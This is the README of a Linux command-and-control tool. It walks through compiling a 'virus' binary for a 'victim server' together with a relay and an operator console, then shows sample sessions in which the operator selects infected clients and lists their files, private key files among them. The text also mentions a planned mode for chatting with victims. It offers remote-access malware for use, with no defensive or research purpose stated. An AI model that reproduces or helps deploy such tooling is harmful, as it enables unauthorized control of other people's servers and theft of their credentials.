Linux Server C2 Controller

Step 1:
Replace the ip address "192.168.80.132" in the tcsl.cpp and host.cpp as your server ipv4 address

Step 2:
Copy tcsl.cpp to your Linux Server
virus.cpp to your victim server
host.cpp to your local machine as control side
and then compile:

g++ tcsl.cpp -o tcsl 
g++ host.cpp -o host 
g++ virus.cpp -o server 

Step 3: 
Open 3 terminals and run the command seperately:
./tcsl
Support any amounts of Clients' connections
the Host and Client is auto-recognized:  
./virus
./host

Step 4:
Please use 'hs' followed with the client numbers you pick.
For example: 'hs 1'
Use 'hh' to check the connected clients.

Step 5:
Enjoy your commands in the host terminal and control your client as terminal.
For example:
Connected to the server.
No client connected.
┌──(root♪hr0g) - [~]

└─# ls
Please use 'hs' followed with the client numbers you pick.

For example: 'hs 1'

Use 'hh' to check the connected clients.
┌──(root♪hr0g) - [~]

└─# hh

Client 1:  Ip: 223.104.76.166

┌──(root♪hr0g) - [~]

└─# hs 1
Client 1 selected.
┌──(root♪hr0g) - [~1]

└─# ls 1

ca.crt
ca.key
dh.pem
ha.crt
ha.key
hr0g.crt
hr0g.key
server.conf

┌──(root♪hr0g) - [~1]

└─# exit

Exited.
Client 1:  Ip: 223.104.76.166

┌──(root♪hr0g) - [~]

└─# hs 1
Client 1 selected.
┌──(root♪hr0g) - [~1]

└─# ls 1

ca.crt
ca.key
dh.pem
ha.crt
ha.key
hr0g.crt
hr0g.key
server.conf

┌──(root♪hr0g) - [~1]

└─# hs 2
Client 2 selected.
┌──(root♪hr0g) - [~2]

└─# hh

Client 1:  Ip: 223.104.76.166
Client 2:  Ip: 223.104.76.166

┌──(root♪hr0g) - [~2]

└─# exit

Exited.
Client 1:  Ip: 223.104.76.166
Client 2:  Ip: 223.104.76.166

┌──(root♪hr0g) - [~]

└─# hs 1
Client 1 selected.
┌──(root♪hr0g) - [~1]
└─# exit

Exited.
Client 1:  Ip: 223.104.76.166
Client 2:  Ip: 223.104.76.166

┌──(root♪hr0g) - [~]

└─# ls
Please use 'hs' followed with the client numbers you pick.

For example: 'hs 1'

Use 'hh' to check the connected clients.
┌──(root♪hr0g) - [~]

└─# 

use 'chatmode' to communicate with victims(under development)
